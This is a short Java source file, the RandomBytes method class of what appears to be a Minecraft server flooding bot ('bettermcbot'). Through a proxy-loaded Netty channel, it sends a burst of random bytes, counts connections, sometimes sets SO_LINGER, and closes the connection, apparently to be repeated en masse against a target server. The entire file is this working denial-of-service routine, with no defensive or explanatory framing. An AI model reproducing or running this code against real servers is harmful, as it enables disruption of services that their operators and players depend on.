package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelOption;
import java.security.SecureRandom;

import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;

public class RandomBytes implements Method {
   private static final SecureRandom RANDOM = new SecureRandom();

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      byte[] bytes = new byte[4 + RANDOM.nextInt(128)];
      RANDOM.nextBytes(bytes);
      channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      if (RANDOM.nextBoolean()) {
         channel.config().setOption(ChannelOption.SO_LINGER, 1);
      }

      channel.close();
   }
}
